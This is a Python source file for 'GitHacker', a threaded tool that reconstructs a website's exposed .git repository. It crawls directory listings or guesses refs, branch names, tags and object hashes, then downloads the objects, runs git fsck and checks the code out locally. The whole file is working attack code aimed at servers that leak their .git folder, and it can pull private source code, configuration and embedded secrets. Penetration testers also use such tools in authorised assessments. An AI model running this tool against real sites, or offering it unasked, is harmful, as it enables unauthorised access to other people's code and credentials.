import requests
import os
import threading
import queue
import coloredlogs
import logging
import re
import git
import subprocess
import argparse
import bs4

coloredlogs.install(fmt='%(asctime)s %(levelname)s %(message)s')


def md5(data):
    import hashlib
    return hashlib.md5(bytes(data, encoding="utf-8")).hexdigest()


class GitHacker():
    def __init__(self, url, dst, threads=0x08) -> None:
        self.q = queue.Queue()
        self.url = url
        self.dst = dst
        self.repo = None
        self.thread_number = threads
        self.max_semanic_version = 10

    def start(self):
        for _ in range(self.thread_number):
            threading.Thread(target=self.worker, daemon=True).start()

        if self.directory_listing_enabled():
            self.sighted()
        else:
            self.blind()

    def directory_listing_enabled(self):
        response = requests.get("{}{}".format(self.url, ".git/"))
        keywords = {
            "apache": "<title>Index of",
            "nginx": "<title>Index of",
        }
        if response.status_code == 200:
            for server, keyword in keywords.items():
                if keyword in response.text:
                    logging.info(
                        "Directory listing enable under: {}".format(server))
                    return True
        return False

    def sighted(self):
        self.add_folder(self.url, ".git/")
        self.q.join()
        self.checkout()

    def add_folder(self, base_url, folder):
        url = "{}{}".format(base_url, folder)
        soup = bs4.BeautifulSoup(requests.get(
            url).text, features="html.parser")
        links = soup.find_all("a")
        for link in links:
            href = link['href']
            if href == "../" or href == "/":
                continue
            if href.endswith("/"):
                self.add_folder(url, href)
            else:
                file_url = "{}{}".format(url, href)
                print("file:", file_url)
                path = file_url.replace(self.url, "").split("/")
                self.q.put(path)

    def blind(self):
        logging.info('Downloading basic files...')
        tn = self.add_basic_file_tasks()
        if tn > 0:
            self.q.join()

        logging.info('Downloading head files...')
        tn = self.add_head_file_tasks()
        if tn > 0:
            self.q.join()

        logging.info('Downloading blob files...')
        self.repo = git.Repo(self.dst)
        tn = self.add_blob_file_tasks()
        if tn > 0:
            self.q.join()

        logging.info('Running git fsck files...')
        while True:
            content = "{}".format(subprocess.run(
                ['git', "fsck"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                cwd=self.dst,
            ))
            tn = self.add_hashes_parsed(content)
            if tn > 0:
                self.q.join()
            else:
                break

        logging.info("Running packed files...\r")
        tn = self.add_packed_file_tasks()
        if tn > 0:
            self.q.join()

        self.checkout()

    def checkout(self):
        logging.info("Checkout files...")
        subprocess.run(
            ["git", "checkout", "."],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            cwd=self.dst
        )

        logging.info("Check it out in folder: {}".format(self.dst))

    def add_packed_file_tasks(self):
        # Download .git/objects/info/pack
        info_pack = [".git", "objects", "info", "pack"]
        fs_path = os.path.join(self.dst, os.path.sep.join(info_pack))
        url_path = "/".join(info_pack)
        url = "{}{}".format(self.url, url_path)
        status_code, length, result = self.wget(url, fs_path)

        n = 0
        if result:
            logging.info("Pack info [{}]: {} bytes\r".format(
                status_code, length))
            with open(fs_path, "rb") as f:
                content = f.read()
            hashes = re.findall(r"([a-f\d]{40})", content)
            for hash in hashes:
                n += 2
                # Download .git/objects/pack/pack-{hash}.idx
                self.q.put([".git", "objects", "pack",
                            "pack-{}.idx".format(hash)])
                # Download .git/objects/pack/pack-{hash}.pack
                self.q.put([".git", "objects", "pack",
                            "pack-{}.pack".format(hash)])
        else:
            logging.error("No packed files")
        return n

    def add_hashes_parsed(self, content):
        hashes = re.findall(r"([a-f\d]{40})", content)
        n = 0
        for hash in hashes:
            n += 1
            self.q.put([".git", "objects", hash[0:2], hash[2:]])
        return n

    def add_head_file_tasks(self):
        n = 0
        with open(os.path.join(self.dst, os.path.sep.join([".git", "HEAD"])), "r") as f:
            for line in f:
                if line.startswith("ref: "):
                    ref_path = line.split("ref: ")[1].strip()
                    file_path = os.path.join(
                        self.dst, os.path.sep.join([".git", "logs", ref_path]))
                    if os.path.exists(file_path):
                        with open(file_path) as ff:
                            data = ff.read()
                            n += self.add_hashes_parsed(data)
        return n

    def add_basic_file_tasks(self):
        files = [
            [".git", "COMMIT_EDITMSG"],
            [".git", "config"],
            [".git", "description"],
            [".git", "FETCH_HEAD"],
            [".git", "HEAD"],
            [".git", "hooks", "applypatch-msg.sample"],
            [".git", "hooks", "commit-msg.sample"],
            [".git", "hooks", "fsmonitor-watchman.sample"],
            [".git", "hooks", "post-update.sample"],
            [".git", "hooks", "pre-applypatch.sample"],
            [".git", "hooks", "pre-commit.sample"],
            [".git", "hooks", "pre-merge-commit.sample"],
            [".git", "hooks", "pre-push.sample"],
            [".git", "hooks", "pre-rebase.sample"],
            [".git", "hooks", "pre-receive.sample"],
            [".git", "hooks", "prepare-commit-msg.sample"],
            [".git", "hooks", "update.sample"],
            [".git", "hooks", "applypatch-msg"],
            [".git", "hooks", "commit-msg"],
            [".git", "hooks", "fsmonitor-watchman"],
            [".git", "hooks", "post-update"],
            [".git", "hooks", "pre-applypatch"],
            [".git", "hooks", "pre-commit"],
            [".git", "hooks", "pre-merge-commit"],
            [".git", "hooks", "pre-push"],
            [".git", "hooks", "pre-rebase"],
            [".git", "hooks", "pre-receive"],
            [".git", "hooks", "prepare-commit-msg"],
            [".git", "hooks", "update"],
            [".git", "index"],
            [".git", "info", "exclude"],
            [".git", "logs", "HEAD"],
            [".git", "logs", "refs", "remotes", "origin", "HEAD"],
            [".git", "logs", "refs", "stash"],
            [".git", "ORIG_HEAD"],
            [".git", "packed-refs"],
            [".git", "refs", "remotes", "origin", "HEAD"],
            # git stash
            [".git", "refs", "stash"],
            # pack
            [".git", "objects", "info", "alternates"],
            [".git", "objects", "info", "http-alternates"],
            [".git", "objects", "info", "packs"],
        ]

        # git tags
        for major in range(self.max_semanic_version):
            for minor in range(self.max_semanic_version):
                for patch in range(self.max_semanic_version):
                    files.append(
                        [".git", "refs", "tags", "v{}.{}.{}".format(major, minor, patch)])
                    files.append(
                        [".git", "refs", "tags", "{}.{}.{}".format(major, minor, patch)])

        branch_names = ["master", "main", "dev", "release", "test",
                        "testing", "feature", "ng", "fix", "hotfix", "quickfix", ]
        # git remote branches
        expand_branch_name_folder = [
            [".git", "logs", "refs", "heads", None],
            [".git", "logs", "refs", "remotes", "origin", None],
            [".git", "refs", "remotes", "origin", None],
            [".git", "refs", "heads", None],
        ]
        for folder in expand_branch_name_folder:
            for branch_name in branch_names:
                folder_copy = folder.copy()
                folder_copy[-1] = branch_name
                files.append(folder_copy)
        n = 0
        for item in files:
            self.q.put(item)
            n += 1
        return n

    def add_blob_file_tasks(self):
        n = 0
        for _, blob in self.repo.index.iter_blobs():
            hash = blob.hexsha
            self.q.put([".git", "objects", hash[0:2], hash[2:]])
            n += 1
        return n

    def worker(self):
        while True:
            path = self.q.get()
            if "00000000000000000000000000000000000000" in path:
                self.q.task_done()
                continue
            else:
                fs_path = os.path.join(self.dst, os.path.sep.join(path))
                url_path = "/".join(path)
                url = "{}{}".format(self.url, url_path)
                if not os.path.exists(fs_path):
                    status_code, length, result = self.wget(url, fs_path)
                    if result:
                        logging.info('[{:d} bytes] {} {}'.format(
                            length, status_code, url_path))
                    else:
                        logging.error('[{:d} bytes] {} {}'.format(
                            length, status_code, url_path))
                self.q.task_done()

    def check_file_content(self, content):
        if content.startswith(b"<") or len(content) == 0:
            return False
        return True

    def wget(self, url, path):
        response = requests.get(url)
        folder = os.path.dirname(path)
        try:
            os.makedirs(folder)
        except:
            pass
        status_code = response.status_code
        content = response.content
        result = False
        if status_code == 200 and self.check_file_content(content):
            with open(path, "wb") as f:
                n = f.write(content)
                if n == len(content):
                    result = True
        return (status_code, len(content), result)


def remove_suffixes(s, suffixes):
    r = s
    for suffix in suffixes:
        if s.endswith(suffix):
            r = s[0:-len(suffix)]
    return r


def append_if_not_exists(s, suffix):
    if not s.endswith(suffix):
        return s + suffix
    return s


def main():
    parser = argparse.ArgumentParser(description='GitHacker')
    parser.add_argument('--url', required=True,
                        help='url of the target website which expose `.git` folder')
    parser.add_argument('--folder', required=True,
                        help='the local folder to store the git repository')
    parser.add_argument('--threads', required=False, default=0x04,
                        type=int, help='threads number to download from internet')
    args = parser.parse_args()
    GitHacker(
        append_if_not_exists(remove_suffixes(
            args.url, ['.git', '.git/']), '/'),
        args.folder,
        threads=args.threads,
    ).start()


if __name__ == "__main__":
    main()
